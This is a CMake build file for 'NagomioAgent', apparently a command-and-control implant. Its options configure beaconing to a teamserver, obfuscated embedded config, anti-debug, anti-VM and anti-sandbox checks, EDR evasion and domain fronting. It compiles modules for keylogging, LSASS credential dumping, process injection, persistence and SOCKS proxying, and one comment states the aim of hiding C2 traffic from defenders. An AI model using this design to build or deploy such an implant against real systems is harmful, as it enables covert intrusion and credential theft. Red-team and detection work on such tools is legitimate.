cmake_minimum_required(VERSION 3.10)
project(NagomioAgent)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

set(NAGOMIO_DEFAULT_CALLBACK_URL "http://127.0.0.1:8080" CACHE STRING "Default teamserver callback URL")
set(NAGOMIO_DEFAULT_SLEEP_SECONDS "5" CACHE STRING "Default beacon sleep in seconds")
set(NAGOMIO_DEFAULT_JITTER_PERCENT "0" CACHE STRING "Default beacon sleep jitter percent")
set(NAGOMIO_DEFAULT_AGENT_ID "" CACHE STRING "Default agent identifier")
set(NAGOMIO_DEFAULT_AGENT_TOKEN "" CACHE STRING "Default agent endpoint token / PSK")
set(NAGOMIO_CALLBACK_URL_XOR "0x00" CACHE STRING "XOR encoded callback URL")
set(NAGOMIO_CALLBACK_URL_XOR_LEN "0" CACHE STRING "XOR encoded callback URL length")
set(NAGOMIO_AGENT_ID_XOR "0x00" CACHE STRING "XOR encoded agent id")
set(NAGOMIO_AGENT_ID_XOR_LEN "0" CACHE STRING "XOR encoded agent id length")
set(NAGOMIO_AGENT_TOKEN_XOR "0x00" CACHE STRING "XOR encoded agent token / PSK")
set(NAGOMIO_AGENT_TOKEN_XOR_LEN "0" CACHE STRING "XOR encoded agent token length")
set(NAGOMIO_XOR_KEY "90" CACHE STRING "XOR config key")
set(NAGOMIO_XOR_CONFIG OFF CACHE BOOL "XOR-obfuscate embedded config strings")
set(NAGOMIO_STEALTH OFF CACHE BOOL "Enable stealth mode")
set(NAGOMIO_ANTI_DEBUG OFF CACHE BOOL "Enable anti-debug checks")
set(NAGOMIO_ANTI_VM OFF CACHE BOOL "Enable anti-vm checks")
set(NAGOMIO_ANTI_SANDBOX OFF CACHE BOOL "Enable anti-sandbox checks")
set(NAGOMIO_DAEMONIZE OFF CACHE BOOL "Daemonize on POSIX platforms")
set(NAGOMIO_STATIC_RUNTIME ON CACHE BOOL "Statically link available runtime libraries")
set(NAGOMIO_CALLBACK_USES_HTTPS OFF CACHE BOOL "The embedded callback URL uses HTTPS")
set(NAGOMIO_KILL_DATE_EPOCH "0" CACHE STRING "Unix epoch after which agent self-destructs (0 = disabled)")
set(NAGOMIO_UA_RANDOMIZE OFF CACHE BOOL "Randomize User-Agent string per beacon")
set(NAGOMIO_SLEEP_OBFUSCATE OFF CACHE BOOL "Obfuscate sleep intervals to evade EDR sleep tampering")
set(NAGOMIO_WIRE_ENCRYPTION OFF CACHE BOOL "Seal /beacon and /response bodies with ChaCha20-Poly1305")
set(NAGOMIO_PROFILE "default" CACHE STRING "Callback profile identifier (default|cdn_metrics|analytics|dead_drop)")
set(NAGOMIO_SNI_OVERRIDE "" CACHE STRING "TLS SNI override (for domain-front style deployments)")

find_package(Threads REQUIRED)

set(NAGOMIO_HTTPS_SUPPORT OFF)
if(NAGOMIO_CALLBACK_USES_HTTPS AND NOT WIN32)
    find_package(OpenSSL REQUIRED)
    set(NAGOMIO_HTTPS_SUPPORT ON)
else()
    if(NOT CMAKE_CROSSCOMPILING)
        find_package(OpenSSL QUIET)
        if(OPENSSL_FOUND)
            set(NAGOMIO_HTTPS_SUPPORT ON)
        endif()
    endif()
endif()

# Wire envelope (B1) requires ChaCha20-Poly1305 which lives in libcrypto on
# Linux. Force-enable on Linux builds so the agent can seal bodies even when
# the callback URL is plain HTTP — defenders shouldn't see the C2 JSON
# signature on the wire. Windows uses BCrypt (always available on Win10+).
if(NOT WIN32)
    find_package(OpenSSL REQUIRED)
    set(NAGOMIO_HAS_CHACHA20POLY1305 ON)
endif()

configure_file(
    ${CMAKE_CURRENT_SOURCE_DIR}/src/build_config.h.in
    ${CMAKE_CURRENT_BINARY_DIR}/generated/build_config.h
    @ONLY
)

set(NAGOMIO_BUILD_SHARED OFF CACHE BOOL "Build as a shared library instead of an executable")

set(AGENT_SOURCES
    src/main.cpp
    src/wire.cpp
    src/profiles.cpp
)

if(WIN32)
    list(APPEND AGENT_SOURCES src/evade_win.cpp)
endif()

# Post-exploit modules (B6). Each module compiles in unconditionally so a
# single agent binary can dispatch to any of them at runtime. Module-specific
# source files (e.g. screenshot.cpp that links WIC) can be added behind
# NAGOMIO_MODULE_XYZ flags in the future.
list(APPEND AGENT_SOURCES
    src/modules/registry.cpp
    src/modules/mem_exec.cpp
    src/modules/persist.cpp
    src/modules/whoami.cpp
    src/modules/uninstall.cpp
    src/modules/portscan.cpp
    src/modules/socks.cpp
)

if(WIN32)
    list(APPEND AGENT_SOURCES
        src/modules/inject_win.cpp
        src/modules/screenshot_win.cpp
        src/modules/clipboard_win.cpp
        src/modules/keylog_win.cpp
        src/modules/lsass_win.cpp
    )
endif()

# Agent target
if(NAGOMIO_BUILD_SHARED)
    add_library(nagomio-agent SHARED ${AGENT_SOURCES})
else()
    add_executable(nagomio-agent ${AGENT_SOURCES})
endif()

target_include_directories(nagomio-agent PRIVATE ${CMAKE_CURRENT_BINARY_DIR}/generated)
target_link_libraries(nagomio-agent PRIVATE Threads::Threads)

if(NAGOMIO_HTTPS_SUPPORT)
    target_compile_definitions(nagomio-agent PRIVATE CPPHTTPLIB_OPENSSL_SUPPORT)
    target_link_libraries(nagomio-agent PRIVATE OpenSSL::SSL OpenSSL::Crypto)
endif()

if(WIN32)
    target_link_libraries(nagomio-agent PRIVATE ws2_32 winhttp iphlpapi advapi32 crypt32 gdi32 user32 ntdll bcrypt)
    if(NAGOMIO_STATIC_RUNTIME)
        target_link_options(nagomio-agent PRIVATE -static -static-libgcc -static-libstdc++)
    endif()
endif()
